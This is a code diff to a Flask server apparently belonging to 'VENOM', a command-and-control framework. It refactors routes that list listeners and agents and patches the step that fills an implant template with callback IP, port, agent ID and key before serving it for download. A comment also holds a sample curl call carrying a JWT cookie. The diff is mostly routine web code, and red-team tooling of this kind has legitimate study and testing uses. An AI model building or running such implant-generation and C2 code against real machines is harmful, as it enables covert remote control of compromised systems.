@@ -71,13 +71,21 @@ if __name__ == "__main__":
     def dashboard():
         return 'Dashboard', 200
 
+
     # curl http://localhost:1337/listeners -XPOST -H "content-type: application/json" -d '{"action":"create","port":"443"}' -H "cookie: accessToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NTE5NDY1NTEsImV4cCI6MTY1MTk0NzE1MSwic3ViIjoidmVub21AdmVub20ubG9jYWwifQ.2Qx4EWUe0DYcp1j4WplNpd0ddJt4L3nF6Mk19I-tl_8"
     @app.route('/listeners', methods=['GET', 'POST'])
     @token_required(_SECRET_)
     def listeners():
         #Make this route POST only
         if(request.method == 'GET'):
-            return 'List Listeners with their status', 200
+            listeners = dict()
+            listeners['listeners'] = []
+            i = 0 
+            for listener in getListeners(): 
+                #delete default mongo objectID 
+                del listener['_id']
+                listeners['listeners'].append(listener)
+            return listeners , 200 
 
         elif (request.method == 'POST'):
             if (request.json.get('action') == 'create' and request.json.get('port')):
@@ -124,9 +132,10 @@ if __name__ == "__main__":
                 agentID = "".join(choices(digits, k=5))
                 port = getListener(listenerId).get('port')
                 key = getListener(listenerId).get('key')
-                registerAgent(agentID, listenerId)
+                ip = s.getsockname()[0]
+                registerAgent(agentID, type, listenerId, ip, port)
                 implant = getImplant(type)
-                implant = implant.replace('REPLACE_IP', s.getsockname()[0]).replace(
+                implant = implant.replace('REPLACE_IP', ip).replace(
                     'REPLACE_PORT', str(port)).replace('REPLACE_ID', agentID).replace('REPLACE_KEY', key)
                 return Response(implant,  mimetype='application/octet-stream'), 200
             except:
@@ -146,20 +155,28 @@ if __name__ == "__main__":
                 "agents": str(db.agents.count_documents({'status': {'$eq': 'dead' }}))
             })
     
-    @app.route('/api/getListeners/', methods=['GET'])
+    
+    @app.route('/agents', methods=['POST'])
     @token_required(_SECRET_)
-    def getListneres(): 
-        listeners = dict()
-        listeners['listeners'] = []
+    def agents(): 
+        status = request.json.get('status')
+        agents = dict()
+        agents['agents'] = []
         i = 0 
-        for listener in getListeners(): 
+        for agent in getAgents(): 
             #delete default mongo objectID 
-            del listener['_id']
-            listeners['listeners'].append(listener)
-            
-        
-        return listeners 
-        
+            if(agent['status'] != status): 
+                continue
+            del agent['_id']
+            del agent['status'] 
+            del agent['task'] 
+            del agent['taskResult']
+            del agent['bindListenerID'] 
+            del agent['serverIP'] 
+            del agent['timeout']
+            agents['agents'].append(agent)
+        return agents , 200 
+
 
     parser = ArgumentParser(description='Welcome to VENOM')
     parser.add_argument('--port', type=int, required=True,
